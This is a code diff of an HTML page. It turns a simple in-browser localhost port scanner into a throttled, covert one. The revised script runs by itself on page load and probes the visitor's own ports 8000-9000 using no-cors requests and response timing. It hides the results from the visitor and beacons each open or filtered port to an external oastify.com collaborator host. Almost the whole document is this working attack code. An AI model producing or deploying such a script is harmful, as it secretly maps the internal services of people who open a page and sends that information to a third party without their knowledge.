@@ -1,59 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Headless Browser Port Scanner</title>
+    <title>Throttled Port Scanner (50 RPS)</title>
 </head>
 <body>
-    <h3>Scanning 127.0.0.1 (Ports 8000-9000)...</h3>
-    <ul id="results"></ul>
-
+    <h3 id="status">Ready to scan 127.0.0.1...</h3>
     <script>
-        const resultsList = document.getElementById('results');
-        const target = "localhost";
+        const target = "127.0.0.1";
+        const collabo = "dj0qlo1xzjmknnafrdiv6k8mhdn4buzj.oastify.com";
         const startPort = 8000;
         const endPort = 9000;
+        const delayMs = 20; // 50 requests per second
+
+        const sleep = (ms) => new Promise(res => setTimeout(res, ms));
+
+        async function exfiltrate(port, status) {
+            // Using Beacon API or Image for OOB exfiltration
+            // Beacons are less likely to be killed during page refreshes
+            navigator.sendBeacon(`https://${collabo}/log?p=${port}&s=${status}`);
+        }
 
         async function checkPort(port) {
             const start = performance.now();
             const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 1000); // 1s timeout
+            const timeoutId = setTimeout(() => controller.abort(), 1000);
 
             try {
-                // We use 'fetch' with 'no-cors' to attempt a connection
+                // 'no-cors' is essential for probing local IPs from a public origin
                 await fetch(`http://${target}:${port}`, { mode: 'no-cors', signal: controller.signal });
-                logResult(port, "Open (Fetched)", "green");
+                exfiltrate(port, "OPEN");
             } catch (err) {
                 const duration = performance.now() - start;
-                if (err.name === 'AbortError') {
-                    logResult(port, "Filtered/Open (Timeout)", "orange");
-                } else if (duration > 50) { 
-                    // If it took a bit of time to fail, it might be open but rejecting HTTP
-                    logResult(port, "Potentially Open (Reset)", "blue");
+                // Timing logic: Closed ports reset immediately (< 5ms)
+                // Open ports (even if blocked by LNA) take longer to resolve/error
+                if (duration > 15 || err.name === 'AbortError') {
+                    exfiltrate(port, "OPEN_OR_FILTERED");
                 }
-                // Closed ports usually fail in < 10ms
             } finally {
                 clearTimeout(timeoutId);
             }
         }
 
-        function logResult(port, status, color) {
-            const li = document.createElement('li');
-            li.style.color = color;
-            li.textContent = `Port ${port}: ${status}`;
-            resultsList.appendChild(li);
+        async function startScan() {
+            document.getElementById('status').innerText = "Scanning at 50 RPS...";
             
-            // Exfiltrate: In a real hunt, you'd send this back to your server
-            // fetch(`https://your-attacker-server.com/log?port=${port}&status=${status}`);
-        }
-
-        async function runScanner() {
             for (let port = startPort; port <= endPort; port++) {
-                await checkPort(port);
+                // Fire the request without 'awaiting' the network result 
+                // but 'awaiting' the timer to maintain 50 RPS
+                checkPort(port); 
+                await sleep(delayMs); 
             }
-            logResult("DONE", "Scan Complete", "black");
+
+            document.getElementById('status').innerText = "Scan Complete.";
+            navigator.sendBeacon(`https://${collabo}/FINISHED`);
         }
 
-        runScanner();
+        // Delay start by 1s to ensure page is fully loaded
+        setTimeout(startScan, 1000);
     </script>
 </body>
 </html>
